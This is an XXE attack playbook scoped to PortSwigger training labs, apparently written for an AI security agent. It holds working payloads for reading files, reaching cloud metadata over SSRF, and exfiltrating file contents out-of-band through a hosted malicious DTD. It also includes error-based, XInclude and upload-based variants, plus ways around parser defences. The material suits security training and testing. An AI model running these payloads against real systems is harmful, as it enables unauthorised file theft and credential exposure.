# XML External Entity (XXE) Methodology
## Expert-Level Playbook (in-band, blind OOB, DTD, XInclude, SVG/upload)

> 7 PortSwigger labs. Preserve a valid baseline XML body, add the smallest entity
> declaration needed, and switch to parameter entities / external DTD when direct
> output is blocked. Use `oob_get_domain`/`oob_poll` for blind confirmation.

---

## Phase 1: Find the XML sink

- Any endpoint accepting `Content-Type: application/xml`, `text/xml`, SOAP, or
  parsing uploaded XML/SVG/DOCX/office files.
- Capture one **valid baseline** request (e.g. stock check `/product/stock`).
- If the endpoint takes JSON, try switching `Content-Type` to XML — some parsers
  accept both.

---

## Phase 2: In-band XXE (response reflects parsed XML)

### 2.1 File read
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
The entity value appears where `productId` is echoed.

### 2.2 SSRF via XXE
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```
Iterate the metadata path from the reflected output.

---

## Phase 3: Blind XXE (no reflection)

### 3.1 OOB via external entity
```
oob_get_domain    # get a fresh collaborator domain
```
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://OOB-DOMAIN/"> ]>
<stockCheck><productId>&xxe;</productId>...</stockCheck>
```
Then `oob_poll` for the DNS/HTTP interaction. Use a fresh domain per attempt.

### 3.2 OOB via parameter entities (when normal entities are blocked)
```xml
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://OOB-DOMAIN/x">
  %ext;
]>
```

### 3.3 Exfiltrate file content via external DTD
Host `malicious.dtd` on the exploit server:
```
# exploit_server.store(head, body="<!ENTITY % file SYSTEM 'file:///etc/hostname'>
#   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://OOB/?x=%file;'>\">
#   %eval; %exfil;", path="/malicious.dtd")
```
Then in the request:
```xml
<!DOCTYPE r [ <!ENTITY % xxe SYSTEM "https://exploit-.../malicious.dtd"> %xxe; ]>
```
Read the leaked file from `oob_poll` results.

### 3.4 Error-based exfil (no OOB egress)
```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %eval; %err;
]>
```
The parser error message leaks the file content.

---

## Phase 4: Alternate injection points

| Sub-variant | Technique |
|-------------|-----------|
| XInclude | when you don't control the whole doc: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` |
| SVG / image upload | upload an SVG containing a DOCTYPE+entity; retrieval reflects file read |
| Office/DOCX upload | inject entity into the XML parts inside the archive |
| SOAP | inject DOCTYPE into the SOAP envelope |
| Local DTD reuse | when external DTDs are blocked, abuse an on-disk DTD to redefine entities (error-based) |

---

## Phase 5: Tooling

```
http_request            # send XML bodies, set Content-Type: application/xml
oob_get_domain / oob_poll  # blind XXE / DTD exfil confirmation
exploit_server          # host malicious.dtd for out-of-band exfiltration
caido_local_api         # raw request replay preserving exact body
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| DOCTYPE rejected | Use parameter entities or external DTD form |
| Content-Type enforced | Send exactly `application/xml` (or the observed type) |
| Entities not expanded | Some parsers disable general entities; use `%` parameter entities via external DTD |
| No egress for OOB | Use error-based exfiltration (local/remote DTD) |
| Can't control full doc | Use XInclude or an upload-based XML parser |

## Validation / Success Criteria
- [ ] Changing the entity target changes the response or OOB callback.
- [ ] A control request without the entity produces no matching signal.
- [ ] Required file content / SSRF response / OOB interaction obtained.
- [ ] Lab solved banner observed.
